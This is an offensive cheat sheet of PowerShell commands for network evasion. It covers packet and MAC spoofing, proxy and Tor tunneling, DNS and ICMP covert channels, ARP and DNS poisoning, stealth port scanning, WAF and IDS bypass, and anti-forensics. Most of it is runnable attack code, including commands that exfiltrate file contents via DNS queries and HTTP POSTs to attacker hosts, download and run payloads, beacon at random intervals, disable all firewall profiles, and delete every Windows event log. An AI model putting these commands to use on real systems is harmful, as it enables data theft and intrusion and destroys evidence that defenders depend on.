# Packet Manipulation

#### IP Spoofing
Changing the source IP address of network packets to evade detection or impersonate another device. This makes tracking the true source difficult for network monitoring tools.

- PowerShell IP Spoof with Raw Sockets:
	```powershell
	$ipSpoofedPacket = New-Object System.Net.Sockets.Socket 'AddressFamily.InterNetwork', 'SocketType.Raw', 'ProtocolType.Tcp'
	$ipSpoofedPacket.Bind([System.Net.IPEndPoint]::new([System.Net.IPAddress]::Parse("spoofed_ip"), 0))
	```

#### MAC Address Spoofing
Changing the MAC address of a network adapter to bypass network access controls or evade detection.

- Spoof MAC Address in PowerShell:
	```powershell
	Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "Network Address" -DisplayValue "001122334455"
	```

#### TTL Manipulation
Modify Time-To-Live (TTL) values in network packets to confuse IDS/IPS or evade monitoring systems. Some monitoring systems use TTL to track packet sources.

- Manipulate TTL in PowerShell with Raw Sockets:
	```powershell
	$rawSocket = New-Object Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Tcp)
	$ttl = 64
	$rawSocket.SetSocketOption([Net.Sockets.SocketOptionLevel]::IP, [Net.Sockets.SocketOptionName]::IpTimeToLive, $ttl)
	```

#### Packet Fragmentation
Fragment network packets to evade detection systems that cannot properly reassemble fragmented traffic. This is useful for bypassing simple IDS/IPS rules.

- Fragment HTTP Request:
	```powershell
	$client = New-Object System.Net.WebClient
	$client.DownloadData("http://<target_ip>/smallpart1")
	Start-Sleep -Seconds 2
	$client.DownloadData("http://<target_ip>/smallpart2")
	```

#### User-Agent Spoofing
Change the `User-Agent` string in web requests to blend in with legitimate traffic and evade detection by web monitoring tools.

- Spoof User-Agent in PowerShell Web Request:
	```powershell
	$webclient = New-Object System.Net.WebClient
	$webclient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0)")
	$webclient.DownloadString("http://<target_ip>")
	```

# Network Traffic Encryption

#### PowerShell Tunneling (SSH)
Use PowerShell to tunnel network traffic through SSH for encryption, making it harder for network monitoring tools to inspect or block the traffic.

- Create SSH Tunnel for Encrypted Web Traffic:
	```powershell
	Start-Process "C:\path\to\putty.exe" -ArgumentList "-ssh -D 1080 user@<ssh_server>"
	```

#### PowerShell Tunneling (HTTPS Proxy)
Route traffic through an HTTPS proxy to obfuscate content and evade network-based detection.

- Route Web Traffic Through HTTPS Proxy:
	```powershell
	$proxy = New-Object System.Net.WebProxy("http://<proxy_ip>:<proxy_port>", $true)
	$webclient = New-Object System.Net.WebClient
	$webclient.Proxy = $proxy
	$webclient.DownloadFile("https://<target_ip>/payload.exe", "C:\Temp\payload.exe")
	```

#### HTTP Proxy Tunneling
- Set HTTP Proxy for PowerShell WebClient:
```powershell
$proxy = New-Object System.Net.WebProxy('http://<proxy_ip>:<proxy_port>', $true)
$webclient = New-Object System.Net.WebClient
$webclient.Proxy = $proxy
$webclient.DownloadFile('http://<target_ip>/payload.exe', 'C:\Temp\payload.exe')
```
- Tunneling Through a Proxy (HTTPS):
```powershell
$webclient = New-Object System.Net.WebClient
$webclient.Proxy = New-Object System.Net.WebProxy('http://<proxy_ip>:<proxy_port>', $true)
$webclient.DownloadFile("https://<target_ip>/payload.exe", "C:\Temp\payload.exe")
```

#### VPN Tunneling
Establish a VPN tunnel using OpenVPN or other VPN services to encrypt all network traffic, hiding it from IDS/IPS.

- VPN Connection via PowerShell:
	```powershell
	Add-VpnConnection -Name "CorporateVPN" -ServerAddress <vpn_ip> -TunnelType L2tp -AuthenticationMethod PAP -EncryptionLevel Maximum
	```

#### Tor Network (PowerShell)
Route traffic through the Tor network using PowerShell, effectively anonymizing the source and making it difficult to track.

- Torify PowerShell Traffic:
	```powershell
	Start-Process -FilePath "tor.exe" -ArgumentList "-client -f torrc"
	$proxy = New-Object System.Net.WebProxy("127.0.0.1:9050")
	$webclient = New-Object System.Net.WebClient
	$webclient.Proxy = $proxy
	$webclient.DownloadString("http://<target_ip>")
	```

# Proxy Chain Setup for Anonymity

Proxies can be chained to evade detection and hide the true source of network traffic.

#### Configure PowerShell to Use Multiple Proxies
```powershell
$proxy1 = New-Object System.Net.WebProxy("http://proxy1.com:8080")
$proxy2 = New-Object System.Net.WebProxy("http://proxy2.com:8080")
$webclient = New-Object System.Net.WebClient
$webclient.Proxy = $proxy1
$webclient.DownloadFile("http://<target_ip>/file.exe", "C:\Temp\file.exe")
$webclient.Proxy = $proxy2
$webclient.DownloadFile("http://<target_ip>/file.exe", "C:\Temp\file2.exe")
```

# Layered Encryption and Proxying

#### Double VPN
Use two VPN services to create multiple layers of encryption and IP obfuscation. PowerShell can invoke and control multiple VPN clients to achieve this.

- Start First VPN Connection:
	```powershell
	Add-VpnConnection -Name "VPN1" -ServerAddress <vpn1_ip> -TunnelType SSTP
	```

- Start Second VPN from Within First VPN:
	```powershell
	Add-VpnConnection -Name "VPN2" -ServerAddress <vpn2_ip> -TunnelType PPTP
	```

#### PowerShell Over SSH and Tor (Layered Anonymity)
Route PowerShell commands through SSH and Tor for highly anonymized traffic.

- SSH Over Tor with PowerShell:
	```powershell
	Start-Process -FilePath "tor.exe" -ArgumentList "-client -f torrc"
	ssh -D 9050 user@<pivot_ip>
	```

# Covert Channels

#### DNS Tunneling (PowerShell)
Encapsulate malicious traffic within DNS requests, which are often ignored by security systems. This method helps evade firewalls and proxy restrictions.

- Send DNS Query to Evade Monitoring:
	```powershell
	$dnsData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("Malicious Payload"))
	Resolve-DnsName -Name "$dnsData.malicious.com" -Server <attacker_dns_server>
	```
- Full DNS Tunneling (Covert Data Exfiltration via DNS):
```powershell
$data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content C:\SensitiveData.txt)))
$dnsQuery = "$data.malicious.com"
Resolve-DnsName -Name $dnsQuery -Server <attacker_dns_server>
```
- Evade DNS Monitoring by Spoofing Legitimate DNS Traffic:
```powershell
$dnsPayload = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("payload.exe"))
Invoke-WebRequest -Uri "http://legitimatedomain.com/$dnsPayload" -OutFile C:\Temp\payload.exe
```

#### ICMP Tunneling (PowerShell)
Create covert communication channels over ICMP to evade firewall rules and IDS/IPS systems that do not inspect ICMP packets.

- PowerShell ICMP Covert Channel:
	```powershell
	$icmpSocket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Raw, [System.Net.Sockets.ProtocolType]::Icmp)
	$icmpPacket = [System.Text.Encoding]::ASCII.GetBytes("Hello ICMP")
	$icmpSocket.Send($icmpPacket)
	```
- Covert Channel via ICMP (Ping Requests):
```powershell
$data = "Hidden Command" 
$pingRequest = Test-Connection -ComputerName <target_ip> -BufferSize 32 -Count 1 -AsJob
```

#### HTTP/HTTPS Traffic Obfuscation
```powershell
$data = Get-Content C:\path\to\data.txt
Invoke-RestMethod -Uri http://<target_ip>/exfiltrate -Method Post -Body $data
```
- Exfiltrate Data in Encrypted Form (HTTPS POST):
```powershell
$secureData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content C:\path\to\data.txt)))
Invoke-WebRequest -Uri https://<target_ip>/upload -Method POST -Body $secureData
```
- Hide Data in HTTP Headers (Covert Channel):
```powershell
$webclient = New-Object System.Net.WebClient
$webclient.Headers.Add("X-Covert-Data", "Sensitive Information")
$webclient.DownloadFile("http://<target_ip>/index.html", "C:\Temp\index.html")
```
#### WebSocket Tunneling
Use WebSocket connections, which often bypass firewalls and security filters, to tunnel traffic.

- Create WebSocket Tunnel for PowerShell:
	```powershell
	$ws = New-Object System.Net.WebSockets.ClientWebSocket
	$ws.ConnectAsync("wss://<target_ip>:<target_port>")
	```

# DNS Evasion and Manipulation

#### DNS Spoofing (PowerShell)
Modify or spoof DNS responses to redirect legitimate traffic to malicious servers.

- Spoof DNS Resolution for Network-Based Evasion:
```powershell
Add-DnsClientNrptRule -Namespace ".malicious.com" -NameServers "<attacker_ip>"
```
- Redirect DNS Requests for Specific Domains:
```powershell
Add-DnsServerResourceRecordA -Name "<hostname>" -ZoneName "<target_domain>" -IPv4Address "<attacker_ip>"
```

#### DNS Cache Poisoning (PowerShell)
Poison the local DNS cache to redirect legitimate domain names to malicious IP addresses.

- Poison DNS Cache:
	```powershell
	Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" -Name "Cache" -Value <malicious_ip>
	```

#### Flush DNS Cache
Clear DNS cache to remove evidence of any modifications or poisoned records.

- Flush DNS Cache via PowerShell:
	```powershell
	Clear-DnsClientCache
	```

# Manipulating ARP Cache

#### ARP Poisoning (PowerShell)
Modify the ARP cache to redirect traffic between hosts for man-in-the-middle attacks or to evade detection.

- Add Spoofed ARP Entry:
	```powershell
	netsh interface ipv4 add neighbors "Ethernet" <target_ip> <spoofed_mac>
	```

#### Flush ARP Cache
Clear the ARP cache to remove manipulated entries or reset the network's state.

- Flush ARP Cache:
	```powershell
	netsh interface ip delete arpcache
	```

# Network Reconnaissance Evasion

By altering how services are exposed or hidden, you can evade detection during network service enumeration or exploitation.

#### Hide Specific Services from Network Scans
```powershell
Set-Service -Name "<ServiceName>" -StartupType Manual
```

#### Manipulate Service Discovery by Changing Network Bindings:
```powershell
Set-NetIPInterface -InterfaceAlias "Ethernet" -Dhcp Disabled
Set-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress "10.0.0.5" -PrefixLength 24 -DefaultGateway "10.0.0.1"
```

#### Disable Network Interfaces Temporarily to Avoid Scanning
```powershell
Disable-NetAdapter -Name "Ethernet"
Start-Sleep -Seconds 30
Enable-NetAdapter -Name "Ethernet"
```

#### Slow and Stealthy Scanning
Slow down the rate of scanning to evade IDS/IPS by reducing the frequency and volume of packets sent.
- Stealth Scan Using PowerShell and Test-NetConnection:
	```powershell
	1..100 | ForEach-Object { Test-NetConnection -ComputerName <target_ip> -Port $_; Start-Sleep -Milliseconds 500 }
	```

#### Randomized Port Scanning
Randomize the order of port scanning to avoid triggering network-based detection systems.
- Randomized Port Scan:
	```powershell
	$ports = 1..65535 | Get-Random -Count 100
	$ports | ForEach-Object { Test-NetConnection -ComputerName <target_ip> -Port $_ }
	```

#### Decoy Scanning
Generate decoy traffic to confuse network monitoring systems by simulating traffic from multiple sources.
- Simulate Decoy Traffic with PowerShell:
	```powershell
	1..10 | ForEach-Object { Start-Process powershell -ArgumentList "-Command Test-NetConnection -ComputerName <target_ip> -Port 80" }
	```

# Firewall Evasion Techniques

Firewalls are essential in controlling both inbound and outbound network traffic. Evading firewall rules can allow lateral movement and exfiltration without detection.

#### View Current Firewall Status
```powershell
Get-NetFirewallProfile | Select-Object Name, Enabled
```

#### Disable the Windows Firewall (All Profiles)
```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

#### Disable Firewall Rules Temporarily
Disable firewall rules to allow unrestricted traffic and bypass network monitoring controls.
- Disable Windows Firewall Temporarily:
	```powershell
	Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
	```

#### Create Custom Firewall Rules for Specific Ports
Allow traffic for specific ports used by your attack tools.
```powershell
New-NetFirewallRule -DisplayName "Allow Outbound TCP 8080" -Direction Outbound -LocalPort 8080 -Action Allow
```

#### Add a Firewall Rule to Allow All Traffic
Instead of disabling firewalls entirely, modifying existing firewall rules allows for selective traffic to pass without raising alarms.
```powershell
New-NetFirewallRule -DisplayName "Allow All Traffic" -Direction Inbound -Action Allow
New-NetFirewallRule -DisplayName "Allow All Traffic" -Direction Outbound -Action Allow
```

#### Modify Existing Firewall Rules
Instead of disabling firewalls entirely, modifying existing firewall rules allows for selective traffic to pass without raising alarms.
```powershell
Set-NetFirewallRule -DisplayName "Allow HTTP Traffic" -Direction Outbound -Action Allow
```

#### Remove a Specific Firewall Rule
```powershell
Remove-NetFirewallRule -DisplayName "Allow All Traffic"
```

#### Use Dynamic Port Ranges for Traffic to Avoid Signatures
```powershell
$dynamicPort = Get-Random -Minimum 10000 -Maximum 60000
New-NetFirewallRule -DisplayName "Dynamic Port $dynamicPort" -Direction Outbound -LocalPort $dynamicPort -Protocol TCP -Action Allow
```

# Port Knocking (Firewall Evasion)

Port knocking is a technique where a sequence of network packets are sent to a host before a service or port is opened. This can be used to evade firewalls until the correct "knock" is received.

#### Simple Port Knocking Script
```powershell
$portSeq = @(135, 445, 80)
ForEach ($port in $portSeq) {
    Test-NetConnection -ComputerName <target_ip> -Port $port
}
```

#### Open Firewall Port After Knock Sequence
```powershell
If ($portSeqReceived) {
    New-NetFirewallRule -DisplayName "Knock Rule" -Direction Inbound -LocalPort <port> -Action Allow
}
```

# Load Balancer and WAF Evasion

#### WAF Bypass with Obfuscation
Encode or modify payloads to evade web application firewalls (WAF) that rely on signature-based detection.

- PowerShell Payload Encoding:
	```powershell
	$payload = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("malicious command"))
	Invoke-WebRequest -Uri "http://<target_ip>?cmd=$payload"
	```

#### Domain Fronting
Use high-trust domains like cloud providers to tunnel malicious traffic, bypassing WAF filters.

- PowerShell Domain Fronting:
	```powershell
	$webclient = New-Object System.Net.WebClient
	$webclient.Headers.Add("Host", "fronted.domain.com")
	$webclient.DownloadString("https://legitimate.host/path")
	```

# IDS/IPS Evasion Techniques

#### Signature-Based Detection Evasion
Use polymorphic encoding techniques to evade IDS/IPS signature detection by modifying the payload before sending it.

- Base64 Encode Payload in PowerShell:
	```powershell
	$encodedPayload = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("malicious command"))
	Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedPayload)))
	```

#### Randomize Traffic Patterns
Randomize traffic patterns by altering packet intervals, sizes, and sources to avoid detection by IDS/IPS that rely on traffic analysis.

- Randomize Traffic with Sleep Intervals:
	```powershell
	$randomDelay = Get-Random -Minimum 5 -Maximum 30
	Start-Sleep -Seconds $randomDelay
	Invoke-WebRequest -Uri "http://<target_ip>"
	```
- Generate Random Beaconing Times:
```powershell
While ($true) {
    $sleepTime = Get-Random -Minimum 300 -Maximum 600
    Start-Sleep -Seconds $sleepTime
    Invoke-WebRequest -Uri "http://<target_ip>/ping"
}
```
- Randomize IP Addressing in Payload Delivery:
```powershell
$randomOctet = Get-Random -Minimum 1 -Maximum 254
$targetIP = "192.168.1.$randomOctet"
Invoke-WebRequest -Uri "http://$targetIP/payload.exe" -OutFile C:\Temp\payload.exe
```

# Anti-Forensics and Covering Tracks

#### Secure Deletion of Network Artifacts
Delete network-related evidence such as cached connections, DNS records, and firewall logs.

- Clear DNS Cache:
	```powershell
	Clear-DnsClientCache
	```

#### Delete Firewall Rules to Remove Evidence
Remove custom firewall rules after evasion techniques have been executed.

- Remove Custom Firewall Rule:
	```powershell
	Remove-NetFirewallRule -DisplayName "Allow Outbound TCP 8080"
	```

#### Flush Connection History
Clear logs and history of recent network connections to hide tracks.

- Clear System Logs:
	```powershell
	Remove-Item -Path "C:\Windows\System32\winevt\Logs\*" -Force
	```
